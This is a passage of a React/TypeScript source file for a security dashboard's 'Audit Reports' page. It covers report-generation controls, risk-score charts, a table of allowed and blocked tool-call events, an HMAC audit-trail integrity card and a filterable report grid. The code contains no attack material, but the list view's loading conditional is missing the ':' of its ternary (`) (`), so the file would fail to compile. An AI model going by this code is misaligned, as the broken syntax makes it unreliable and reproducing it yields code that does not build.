                    className="px-4 py-2 rounded-md text-sm font-medium transition-all"
                    style={{
                      backgroundColor:
                        exportFormat === fmt ? tokens.bg.elevated : 'transparent',
                      color:
                        exportFormat === fmt
                          ? tokens.text.primary
                          : tokens.text.secondary,
                    }}
                  >
                    {fmt}
                  </button>
                ))}
              </div>
            </div>

            {/* Include Sections */}
            <div>
              <label
                className="block text-sm mb-2"
                style={{ color: tokens.text.secondary, fontSize: '13px' }}
              >
                Include Sections
              </label>
              <div className="space-y-2">
                {Object.entries(sectionLabels).map(([key, label]) => (
                  <label
                    key={key}
                    className="flex items-center gap-2.5 cursor-pointer"
                  >
                    <div
                      className="w-4 h-4 rounded border flex items-center justify-center transition-all"
                      style={{
                        borderColor: sections[key]
                          ? tokens.accent.blue
                          : tokens.border.default,
                        backgroundColor: sections[key]
                          ? tokens.accent.blue
                          : 'transparent',
                      }}
                      onClick={() => toggleSection(key)}
                    >
                      {sections[key] && <Check size={12} color="#fff" />}
                    </div>
                    <span
                      className="text-sm"
                      style={{ color: tokens.text.secondary }}
                    >
                      {label}
                    </span>
                  </label>
                ))}
              </div>
            </div>
          </div>

          {/* Footer */}
          <div
            className="flex justify-between items-center px-6 py-4 border-t"
            style={{ borderColor: tokens.border.subtle }}
          >
            <button
              onClick={onClose}
              disabled={isGenerating}
              className="px-4 py-2 rounded-lg text-sm font-medium transition-colors"
              style={{
                color: tokens.text.secondary,
                border: `1px solid ${tokens.border.subtle}`,
                backgroundColor: 'transparent',
              }}
            >
              Cancel
            </button>
            <button
              onClick={handleGenerate}
              disabled={isGenerating}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg text-sm font-semibold text-white transition-all hover:brightness-110 disabled:opacity-60"
              style={{
                background: `linear-gradient(135deg, ${tokens.accent.blue}, #1E88E5)`,
              }}
            >
              {isGenerating && (
                <motion.div
                  className="w-4 h-4 border-2 border-white border-t-transparent rounded-full"
                  animate={{ rotate: 360 }}
                  transition={{ duration: 0.6, repeat: Infinity, ease: 'linear' }}
                />
              )}
              {isGenerating ? 'Generating...' : 'Generate Report'}
            </button>
          </div>
        </motion.div>
      </DialogContent>
    </Dialog>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — EXECUTIVE SUMMARY                                  */
/* ------------------------------------------------------------------ */

function ExecutiveSummaryCard({ report }: { report: Report }) {
  const score = report.overallRiskScore;
  const color = riskColor(score);

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.1, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{
        backgroundColor: tokens.bg.base,
        borderColor: tokens.border.subtle,
        borderTop: `2px solid ${color}`,
      }}
    >
      <h2
        className="font-semibold mb-5"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Executive Summary
      </h2>

      <div className="flex flex-col md:flex-row gap-6 items-start">
        {/* Risk Score Circle */}
        <div className="flex flex-col items-center">
          <div
            className="w-28 h-28 rounded-full flex items-center justify-center border-4"
            style={{ borderColor: color }}
          >
            <span
              className="font-bold"
              style={{
                fontSize: '32px',
                lineHeight: 1.1,
                letterSpacing: '-0.02em',
                fontFamily: '"JetBrains Mono", monospace',
                color,
              }}
            >
              {score}
            </span>
          </div>
          <span
            className="mt-2 text-xs font-medium px-2.5 py-1 rounded-full border"
            style={{
              color,
              borderColor:
                score >= 70
                  ? 'rgba(255,77,79,0.2)'
                  : score >= 30
                    ? 'rgba(245,166,35,0.2)'
                    : 'rgba(0,212,170,0.2)',
              backgroundColor:
                score >= 70
                  ? 'rgba(255,77,79,0.12)'
                  : score >= 30
                    ? 'rgba(245,166,35,0.12)'
                    : 'rgba(0,212,170,0.12)',
              fontSize: '12px',
            }}
          >
            {riskLabel(score)}
          </span>
        </div>

        <div className="flex-1">
          <p
            className="mb-5"
            style={{ fontSize: '14px', lineHeight: 1.5, color: tokens.text.secondary }}
          >
            {report.summary}
          </p>

          <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
            {[
              { label: 'Total Calls', value: report.keyMetrics.totalCalls.toLocaleString() },
              { label: 'Allowed %', value: `${report.keyMetrics.allowedPct}%` },
              { label: 'Blocked %', value: `${report.keyMetrics.blockedPct}%` },
              { label: 'Avg Risk', value: String(report.keyMetrics.avgRisk) },
            ].map((m) => (
              <div key={m.label} className="text-center md:text-left">
                <div
                  style={{
                    fontSize: '12px',
                    fontWeight: 500,
                    letterSpacing: '0.02em',
                    color: tokens.text.muted,
                    marginBottom: '4px',
                  }}
                >
                  {m.label}
                </div>
                <div
                  style={{
                    fontSize: '20px',
                    fontWeight: 600,
                    lineHeight: 1.2,
                    letterSpacing: '-0.01em',
                    fontFamily: '"JetBrains Mono", monospace',
                    color: tokens.text.data,
                  }}
                >
                  {m.value}
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — RISK TREND CHART                                   */
/* ------------------------------------------------------------------ */

function RiskTrendCard({ data }: { data: Array<{ day: string; score: number }> }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.2, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{ backgroundColor: tokens.bg.base, borderColor: tokens.border.subtle }}
    >
      <h2
        className="font-semibold mb-5"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Risk Trend
      </h2>
      <div className="h-64">
        <ResponsiveContainer width="100%" height="100%">
          <AreaChart data={data} margin={{ top: 5, right: 5, bottom: 0, left: -10 }}>
            <defs>
              <linearGradient id="riskGradient" x1="0" y1="0" x2="0" y2="1">
                <stop offset="5%" stopColor={tokens.accent.blue} stopOpacity={0.3} />
                <stop offset="95%" stopColor={tokens.accent.blue} stopOpacity={0} />
              </linearGradient>
            </defs>
            <CartesianGrid
              strokeDasharray="3 3"
              stroke="rgba(255,255,255,0.03)"
              vertical={false}
            />
            <XAxis
              dataKey="day"
              tick={{ fill: tokens.text.muted, fontSize: 12 }}
              axisLine={{ stroke: 'rgba(255,255,255,0.08)' }}
              tickLine={false}
            />
            <YAxis
              domain={[0, 100]}
              tick={{ fill: tokens.text.muted, fontSize: 12 }}
              axisLine={false}
              tickLine={false}
            />
            <Tooltip
              contentStyle={{
                backgroundColor: tokens.bg.elevated,
                border: `1px solid ${tokens.border.default}`,
                borderRadius: '8px',
                color: tokens.text.primary,
                fontSize: '13px',
              }}
              formatter={(value: number) => [`Risk: ${value}`, '']}
            />
            <Area
              type="monotone"
              dataKey="score"
              stroke={tokens.accent.blue}
              strokeWidth={2}
              fill="url(#riskGradient)"
              animationDuration={1500}
              animationEasing="ease-out"
            />
          </AreaChart>
        </ResponsiveContainer>
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — BEHAVIORAL BASELINE                                */
/* ------------------------------------------------------------------ */

function BehavioralBaselineCard({
  data,
}: {
  data: Array<{ metric: string; current: number; baseline: number }>;
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.3, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{ backgroundColor: tokens.bg.base, borderColor: tokens.border.subtle }}
    >
      <h2
        className="font-semibold mb-5"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Behavioral Baseline
      </h2>
      <div className="h-72">
        <ResponsiveContainer width="100%" height="100%">
          <RadarChart data={data} cx="50%" cy="50%" outerRadius="75%">
            <PolarGrid stroke="rgba(255,255,255,0.08)" />
            <PolarAngleAxis
              dataKey="metric"
              tick={{ fill: tokens.text.secondary, fontSize: 12 }}
            />
            <PolarRadiusAxis
              domain={[0, 100]}
              tick={{ fill: tokens.text.muted, fontSize: 10 }}
              axisLine={false}
            />
            <Radar
              name="Current"
              dataKey="current"
              stroke={tokens.accent.blue}
              fill={tokens.accent.blue}
              fillOpacity={0.25}
              strokeWidth={2}
            />
            <Radar
              name="Baseline"
              dataKey="baseline"
              stroke={tokens.accent.purple}
              fill={tokens.accent.purple}
              fillOpacity={0.1}
              strokeWidth={1.5}
              strokeDasharray="4 4"
            />
            <Tooltip
              contentStyle={{
                backgroundColor: tokens.bg.elevated,
                border: `1px solid ${tokens.border.default}`,
                borderRadius: '8px',
                color: tokens.text.primary,
                fontSize: '13px',
              }}
            />
          </RadarChart>
        </ResponsiveContainer>
      </div>
      <div className="flex justify-center gap-6 mt-2">
        <div className="flex items-center gap-2">
          <div
            className="w-3 h-3 rounded-full"
            style={{ backgroundColor: tokens.accent.blue }}
          />
          <span className="text-xs" style={{ color: tokens.text.secondary }}>
            Current
          </span>
        </div>
        <div className="flex items-center gap-2">
          <div
            className="w-3 h-3 rounded-full"
            style={{
              backgroundColor: tokens.accent.purple,
              opacity: 0.5,
            }}
          />
          <span className="text-xs" style={{ color: tokens.text.secondary }}>
            Baseline
          </span>
        </div>
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — TOP EVENTS TABLE                                   */
/* ------------------------------------------------------------------ */

function TopEventsCard({ events }: { events: AuditEvent[] }) {
  const statusConfig: Record<
    string,
    { color: string; bg: string; border: string }
  > = {
    allowed: {
      color: tokens.accent.green,
      bg: 'rgba(0,212,170,0.12)',
      border: 'rgba(0,212,170,0.2)',
    },
    warned: {
      color: tokens.accent.amber,
      bg: 'rgba(245,166,35,0.12)',
      border: 'rgba(245,166,35,0.2)',
    },
    blocked: {
      color: tokens.accent.red,
      bg: 'rgba(255,77,79,0.12)',
      border: 'rgba(255,77,79,0.2)',
    },
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.4, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{ backgroundColor: tokens.bg.base, borderColor: tokens.border.subtle }}
    >
      <h2
        className="font-semibold mb-5"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Critical Events
      </h2>

      <div className="overflow-x-auto">
        <table className="w-full">
          <thead>
            <tr style={{ borderBottom: `1px solid ${tokens.border.subtle}` }}>
              {['Event ID', 'Timestamp', 'Tool', 'Action', 'Status', 'Risk'].map(
                (h) => (
                  <th
                    key={h}
                    className="text-left px-3 py-2.5 font-medium"
                    style={{
                      fontSize: '12px',
                      fontWeight: 500,
                      letterSpacing: '0.02em',
                      color: tokens.text.muted,
                    }}
                  >
                    {h}
                  </th>
                )
              )}
            </tr>
          </thead>
          <tbody>
            {events.map((evt, i) => (
              <motion.tr
                key={evt.id}
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{
                  duration: 0.3,
                  delay: i * 0.04,
                  ease: easeSmooth,
                }}
                className="transition-colors"
                style={{ borderBottom: `1px solid ${tokens.border.subtle}` }}
                onMouseEnter={(e: MouseEvent<HTMLTableRowElement>) =>
                  ((e.currentTarget as HTMLTableRowElement).style.backgroundColor = tokens.bg.hover)
                }
                onMouseLeave={(e: MouseEvent<HTMLTableRowElement>) =>
                  ((e.currentTarget as HTMLTableRowElement).style.backgroundColor = 'transparent')
                }
              >
                <td
                  className="px-3 py-3.5"
                  style={{
                    fontFamily: '"JetBrains Mono", monospace',
                    fontSize: '13px',
                    fontWeight: 500,
                    color: tokens.text.data,
                  }}
                >
                  {evt.id}
                </td>
                <td
                  className="px-3 py-3.5"
                  style={{
                    fontFamily: '"JetBrains Mono", monospace',
                    fontSize: '13px',
                    color: tokens.text.secondary,
                  }}
                >
                  {evt.timestamp}
                </td>
                <td
                  className="px-3 py-3.5 text-sm"
                  style={{ color: tokens.text.secondary }}
                >
                  {evt.tool}
                </td>
                <td
                  className="px-3 py-3.5 text-sm max-w-[200px] truncate"
                  style={{ color: tokens.text.secondary }}
                >
                  {evt.action}
                </td>
                <td className="px-3 py-3.5">
                  <span
                    className="text-xs font-medium px-2.5 py-1 rounded-full border"
                    style={{
                      color: statusConfig[evt.status].color,
                      backgroundColor: statusConfig[evt.status].bg,
                      borderColor: statusConfig[evt.status].border,
                      fontSize: '12px',
                    }}
                  >
                    {evt.status}
                  </span>
                </td>
                <td
                  className="px-3 py-3.5"
                  style={{
                    fontFamily: '"JetBrains Mono", monospace',
                    fontSize: '13px',
                    fontWeight: 500,
                    color: riskColor(evt.riskScore),
                  }}
                >
                  {evt.riskScore}
                </td>
              </motion.tr>
            ))}
          </tbody>
        </table>
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — HMAC VERIFICATION                                  */
/* ------------------------------------------------------------------ */

function HmacVerificationCard({
  hmac,
}: {
  hmac: { verified: boolean; blockCount: number; verifiedAt: string };
}) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.5, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{
        backgroundColor: tokens.bg.base,
        borderColor: tokens.border.subtle,
        borderTop: `2px solid ${tokens.accent.green}`,
      }}
    >
      <h2
        className="font-semibold mb-4"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Audit Trail Integrity
      </h2>

      <div className="flex items-center gap-4 mb-4">
        <div
          className="w-12 h-12 rounded-xl flex items-center justify-center"
          style={{ backgroundColor: 'rgba(0,212,170,0.12)' }}
        >
          <Lock size={24} color={tokens.accent.green} />
        </div>
        <div>
          <div className="flex items-center gap-2 mb-1">
            <span
              className="text-xs font-medium px-2.5 py-1 rounded-full border"
              style={{
                color: tokens.accent.green,
                borderColor: 'rgba(0,212,170,0.2)',
                backgroundColor: 'rgba(0,212,170,0.12)',
                fontSize: '12px',
              }}
            >
              Verified
            </span>
          </div>
          <div
            className="text-sm"
            style={{ color: tokens.text.secondary }}
          >
            All audit blocks cryptographically verified
          </div>
        </div>
      </div>

      <div className="grid grid-cols-2 gap-4 mb-4">
        <div
          className="rounded-lg p-4"
          style={{ backgroundColor: tokens.bg.elevated }}
        >
          <div
            className="text-xs mb-1"
            style={{ color: tokens.text.muted, fontWeight: 500, letterSpacing: '0.02em' }}
          >
            Block Count
          </div>
          <div
            style={{
              fontSize: '20px',
              fontWeight: 600,
              fontFamily: '"JetBrains Mono", monospace',
              color: tokens.text.data,
            }}
          >
            {hmac.blockCount.toLocaleString()}
          </div>
        </div>
        <div
          className="rounded-lg p-4"
          style={{ backgroundColor: tokens.bg.elevated }}
        >
          <div
            className="text-xs mb-1"
            style={{ color: tokens.text.muted, fontWeight: 500, letterSpacing: '0.02em' }}
          >
            Verified At
          </div>
          <div
            style={{
              fontSize: '13px',
              fontWeight: 500,
              fontFamily: '"JetBrains Mono", monospace',
              color: tokens.text.data,
            }}
          >
            {hmac.verifiedAt
              ? new Date(hmac.verifiedAt).toLocaleString()
              : '—'}
          </div>
        </div>
      </div>

      <button
        className="text-sm font-medium flex items-center gap-1 transition-colors hover:brightness-110"
        style={{ color: tokens.accent.blue }}
        onClick={() => toast.info('Navigate to Dashboard HMAC section')}
      >
        View Full Chain
        <TrendingUp size={14} />
      </button>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL — RECOMMENDATIONS                                    */
/* ------------------------------------------------------------------ */

function RecommendationsCard({
  recommendations,
}: {
  recommendations: Recommendation[];
}) {
  const priorityConfig: Record<
    RiskLevel,
    { color: string; label: string }
  > = {
    high: { color: tokens.accent.red, label: 'High' },
    medium: { color: tokens.accent.amber, label: 'Medium' },
    low: { color: tokens.accent.green, label: 'Low' },
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, delay: 0.6, ease: easeOutExpo }}
      className="rounded-xl border p-6"
      style={{ backgroundColor: tokens.bg.base, borderColor: tokens.border.subtle }}
    >
      <h2
        className="font-semibold mb-5"
        style={{ fontSize: '20px', lineHeight: 1.25, letterSpacing: '-0.01em', color: tokens.text.primary }}
      >
        Security Recommendations
      </h2>

      <div className="space-y-4">
        {recommendations.map((rec, i) => (
          <motion.div
            key={i}
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.3, delay: 0.6 + i * 0.05, ease: easeSmooth }}
            className="flex gap-4 p-4 rounded-lg"
            style={{ backgroundColor: tokens.bg.elevated }}
          >
            <div className="mt-1 flex-shrink-0">
              <div
                className="w-2.5 h-2.5 rounded-full"
                style={{ backgroundColor: priorityConfig[rec.priority].color }}
              />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 mb-1">
                <h3
                  className="text-sm font-semibold"
                  style={{ color: tokens.text.primary }}
                >
                  {rec.title}
                </h3>
                <span
                  className="text-xs font-medium px-2 py-0.5 rounded-full"
                  style={{
                    color: priorityConfig[rec.priority].color,
                    backgroundColor: `${priorityConfig[rec.priority].color}20`,
                    fontSize: '11px',
                  }}
                >
                  {priorityConfig[rec.priority].label}
                </span>
              </div>
              <p
                className="text-sm"
                style={{ color: tokens.text.secondary, lineHeight: 1.45 }}
              >
                {rec.description}
              </p>
            </div>
          </motion.div>
        ))}
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT DETAIL VIEW                                                 */
/* ------------------------------------------------------------------ */

function ReportDetail({
  report,
  onBack,
}: {
  report: Report;
  onBack: () => void;
}) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      transition={{ duration: 0.3 }}
    >
      {/* Detail Header */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3, ease: easeOutExpo }}
        className="mb-6"
      >
        <button
          onClick={onBack}
          className="flex items-center gap-1 mb-4 text-sm font-medium transition-colors hover:brightness-110"
          style={{ color: tokens.accent.blue }}
        >
          <ChevronLeft size={18} />
          Back to Reports
        </button>

        <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-4">
          <div>
            <h1
              className="font-semibold mb-2"
              style={{
                fontSize: '32px',
                lineHeight: 1.15,
                letterSpacing: '-0.02em',
                color: tokens.text.primary,
              }}
            >
              {report.name}
            </h1>
            <div className="flex flex-wrap items-center gap-3">
              <span
                className="flex items-center gap-1 text-sm"
                style={{ color: tokens.text.secondary }}
              >
                <Calendar size={14} />
                {report.dateRange}
              </span>
              <span
                className="text-xs font-medium px-2.5 py-1 rounded-full border"
                style={{
                  color: tokens.accent.blue,
                  borderColor: 'rgba(41,121,255,0.2)',
                  backgroundColor: 'rgba(41,121,255,0.12)',
                  fontSize: '12px',
                }}
              >
                {report.format}
              </span>
              <span
                className="text-xs font-medium px-2.5 py-1 rounded-full border"
                style={{
                  color: tokens.accent.green,
                  borderColor: 'rgba(0,212,170,0.2)',
                  backgroundColor: 'rgba(0,212,170,0.12)',
                  fontSize: '12px',
                }}
              >
                Generated
              </span>
              <span
                className="flex items-center gap-1 text-xs"
                style={{ color: tokens.text.muted }}
              >
                <Clock size={12} />
                {report.relativeTime}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => toast.success('Report download started')}
              className="flex items-center gap-2 px-4 py-2.5 rounded-lg text-sm font-semibold text-white transition-all hover:brightness-110"
              style={{ background: `linear-gradient(135deg, ${tokens.accent.blue}, #1E88E5)` }}
            >
              <Download size={16} />
              Download
            </button>
            <button
              onClick={() => toast.success('Share link copied to clipboard')}
              className="px-4 py-2.5 rounded-lg text-sm font-medium transition-colors"
              style={{
                color: tokens.text.primary,
                border: `1px solid ${tokens.border.default}`,
                backgroundColor: tokens.bg.elevated,
              }}
            >
              Share
            </button>
            <button
              onClick={() => {
                onBack();
                toast.success('Report deleted');
              }}
              className="px-3 py-2.5 rounded-lg text-sm font-medium transition-colors"
              style={{
                color: tokens.text.secondary,
                border: `1px solid ${tokens.border.subtle}`,
                backgroundColor: 'transparent',
              }}
              onMouseEnter={(e) =>
                (e.currentTarget.style.color = tokens.accent.red)
              }
              onMouseLeave={(e) =>
                (e.currentTarget.style.color = tokens.text.secondary)
              }
            >
              <Trash2 size={16} />
            </button>
          </div>
        </div>
      </motion.div>

      {/* Sections */}
      <div className="space-y-6">
        <ExecutiveSummaryCard report={report} />
        <RiskTrendCard data={report.riskTrendData} />
        <BehavioralBaselineCard data={report.radarData} />
        <TopEventsCard events={report.topEvents} />
        <HmacVerificationCard hmac={report.hmacStatus} />
        <RecommendationsCard recommendations={report.recommendations} />
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  MAIN REPORTS PAGE                                                  */
/* ------------------------------------------------------------------ */

type StatusFilter = 'all' | ReportStatus;
type FormatFilter = 'all' | ReportFormat;

export default function Reports() {
  const [reports, setReports] = useState<Report[]>(REPORTS);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState<StatusFilter>('all');
  const [formatFilter, setFormatFilter] = useState<FormatFilter>('all');
  const [sortOrder, setSortOrder] = useState<'newest' | 'oldest'>('newest');
  const [showGenerateModal, setShowGenerateModal] = useState(false);
  const [selectedReport, setSelectedReport] = useState<Report | null>(null);
  const [dateFilter, setDateFilter] = useState('all');

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 1200);
    return () => clearTimeout(timer);
  }, []);

  const filteredReports = reports.filter((r) => {
    const matchesSearch = r.name.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesStatus = statusFilter === 'all' || r.status === statusFilter;
    const matchesFormat = formatFilter === 'all' || r.format === formatFilter;
    return matchesSearch && matchesStatus && matchesFormat;
  });

  const sortedReports = [...filteredReports].sort((a, b) => {
    if (sortOrder === 'newest') {
      return new Date(b.generatedAt || 0).getTime() - new Date(a.generatedAt || 0).getTime();
    }
    return new Date(a.generatedAt || 0).getTime() - new Date(b.generatedAt || 0).getTime();
  });

  const handleViewReport = useCallback((report: Report) => {
    setSelectedReport(report);
  }, []);

  const handleBack = useCallback(() => {
    setSelectedReport(null);
  }, []);

  const handleGenerate = useCallback((newReport: Report) => {
    setReports((prev) => [newReport, ...prev]);
    toast.success('Report generated successfully');
  }, []);

  const statusFilters: { value: StatusFilter; label: string }[] = [
    { value: 'all', label: 'All' },
    { value: 'generated', label: 'Generated' },
    { value: 'processing', label: 'Processing' },
    { value: 'failed', label: 'Failed' },
  ];

  const formatFilters: { value: FormatFilter; label: string }[] = [
    { value: 'all', label: 'All' },
    { value: 'PDF', label: 'PDF' },
    { value: 'JSON', label: 'JSON' },
  ];

  const hasReports = reports.length > 0;

  /* --- RENDER DETAIL VIEW --- */
  if (selectedReport) {
    return (
      <div style={pageStyles.container}>
        <div className="max-w-[1440px] mx-auto px-6 py-6">
          <ReportDetail report={selectedReport} onBack={handleBack} />
        </div>
      </div>
    );
  }

  /* --- RENDER LIST VIEW --- */
  return (
    <div style={pageStyles.container}>
      <div className="max-w-[1440px] mx-auto px-6 py-6">
        {/* Page Header */}
        <motion.div
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, ease: easeOutExpo }}
          className="flex flex-col md:flex-row md:items-end md:justify-between gap-4 pb-6 mb-6"
          style={{ borderBottom: `1px solid rgba(255,255,255,0.04)` }}
        >
          <div>
            <h1
              className="font-semibold mb-1"
              style={{
                fontSize: '24px',
                lineHeight: 1.2,
                letterSpacing: '-0.01em',
                color: tokens.text.primary,
              }}
            >
              Audit Reports
            </h1>
            <p
              className="text-sm"
              style={{ color: tokens.text.secondary, fontSize: '13px' }}
            >
              Generate and review security audit reports
            </p>
          </div>
          <div className="flex items-center gap-3">
            <div className="relative">
              <Search
                size={16}
                className="absolute left-3 top-1/2 -translate-y-1/2"
                style={{ color: tokens.text.muted }}
              />
              <Input
                placeholder="Search reports..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-9 border-0 text-white placeholder:text-[#5C6270]"
                style={{
                  backgroundColor: tokens.bg.input,
                  border: `1px solid ${tokens.border.subtle}`,
                  borderRadius: '8px',
                  padding: '10px 14px 10px 36px',
                  fontSize: '14px',
                  minWidth: '240px',
                }}
              />
            </div>
            <button
              onClick={() => setShowGenerateModal(true)}
              className="flex items-center gap-2 px-5 py-2.5 rounded-lg text-sm font-semibold text-white transition-all hover:brightness-110"
              style={{
                background: `linear-gradient(135deg, ${tokens.accent.blue}, #1E88E5)`,
              }}
            >
              <FileText size={16} />
              Generate Report
            </button>
          </div>
        </motion.div>

        {/* Loading State */}
        {loading ? (
          <SkeletonGrid />
        ) (
          <>
            {/* No reports at all */}
            {!hasReports ? (
              <EmptyState onGenerate={() => setShowGenerateModal(true)} />
            ) : (
              <>
                {/* Filter Bar */}
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3, delay: 0.1, ease: easeOutExpo }}
                  className="flex flex-wrap items-center gap-3 mb-6"
                >
                  {/* Date filter */}
                  <div className="flex items-center gap-2">
                    <Calendar size={14} style={{ color: tokens.text.muted }} />
                    <Select value={dateFilter} onValueChange={setDateFilter}>
                      <SelectTrigger
                        className="border-0 text-white h-9"
                        style={{
                          backgroundColor: tokens.bg.base,
                          border: `1px solid ${tokens.border.subtle}`,
                          borderRadius: '8px',
                          minWidth: '150px',
                          fontSize: '13px',
                        }}
                      >
                        <SelectValue placeholder="Date range" />
                      </SelectTrigger>
                      <SelectContent
                        style={{
                          backgroundColor: tokens.bg.elevated,
                          border: `1px solid ${tokens.border.default}`,
                          borderRadius: '8px',
                        }}
                      >
                        <SelectItem value="all">All Time</SelectItem>
                        <SelectItem value="7d">Last 7 days</SelectItem>
                        <SelectItem value="30d">Last 30 days</SelectItem>
                        <SelectItem value="90d">Last 90 days</SelectItem>
                        <SelectItem value="custom">Custom range</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {/* Status filters */}
                  <div className="flex items-center gap-1.5">
                    {statusFilters.map((sf) => (
                      <button
                        key={sf.value}
                        onClick={() => setStatusFilter(sf.value)}
                        className="px-3 py-1.5 rounded-full text-xs font-medium transition-all border"
                        style={{
                          backgroundColor:
                            statusFilter === sf.value
                              ? tokens.bg.elevated
                              : 'transparent',
                          borderColor:
                            statusFilter === sf.value
                              ? tokens.border.hover
                              : tokens.border.subtle,
                          color:
                            statusFilter === sf.value
                              ? tokens.text.primary
                              : tokens.text.secondary,
                          fontSize: '12px',
                        }}
                      >
                        {sf.label}
                      </button>
                    ))}
                  </div>

                  {/* Format filters */}
                  <div className="flex items-center gap-1.5">
                    {formatFilters.map((ff) => (
                      <button
                        key={ff.value}
                        onClick={() => setFormatFilter(ff.value)}
                        className="px-3 py-1.5 rounded-full text-xs font-medium transition-all border"
                        style={{
                          backgroundColor:
                            formatFilter === ff.value
                              ? tokens.bg.elevated
                              : 'transparent',
                          borderColor:
                            formatFilter === ff.value
                              ? tokens.border.hover
                              : tokens.border.subtle,
                          color:
                            formatFilter === ff.value
                              ? tokens.text.primary
                              : tokens.text.secondary,
                          fontSize: '12px',
                        }}
                      >
                        {ff.label}
                      </button>
                    ))}
                  </div>

                  {/* Sort */}
                  <div className="ml-auto flex items-center gap-2">
                    <Filter size={14} style={{ color: tokens.text.muted }} />
                    <Select
                      value={sortOrder}
                      onValueChange={(v) => setSortOrder(v as 'newest' | 'oldest')}
                    >
                      <SelectTrigger
                        className="border-0 text-white h-9"
                        style={{
                          backgroundColor: tokens.bg.base,
                          border: `1px solid ${tokens.border.subtle}`,
                          borderRadius: '8px',
                          minWidth: '150px',
                          fontSize: '13px',
                        }}
                      >
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent
                        style={{
                          backgroundColor: tokens.bg.elevated,
                          border: `1px solid ${tokens.border.default}`,
                          borderRadius: '8px',
                        }}
                      >
                        <SelectItem value="newest">Newest First</SelectItem>
                        <SelectItem value="oldest">Oldest First</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </motion.div>

                {/* No matching results */}
                {sortedReports.length === 0 ? (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="flex flex-col items-center justify-center py-16 text-center"
                  >
                    <Search size={32} style={{ color: tokens.text.muted, marginBottom: '12px' }} />
                    <p style={{ color: tokens.text.secondary }}>
                      No reports match your filters.
                    </p>
                    <button
                      onClick={() => {
                        setSearchQuery('');
                        setStatusFilter('all');
                        setFormatFilter('all');
                      }}
                      className="mt-3 text-sm font-medium transition-colors hover:brightness-110"
                      style={{ color: tokens.accent.blue }}
                    >
                      Clear all filters
                    </button>
                  </motion.div>
                ) : (
                  /* Report Grid */
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    {sortedReports.map((report, index) => (
                      <ReportCard
                        key={report.id}
                        report={report}
                        index={index}
                        onView={handleViewReport}
                      />
                    ))}
                  </div>
                )}
              </>
            )}
          </>
        )}

        {/* Generate Report Modal */}
        <GenerateReportModal
          open={showGenerateModal}
          onClose={() => setShowGenerateModal(false)}
          onGenerate={handleGenerate}
        />
      </div>
    </div>
  );
}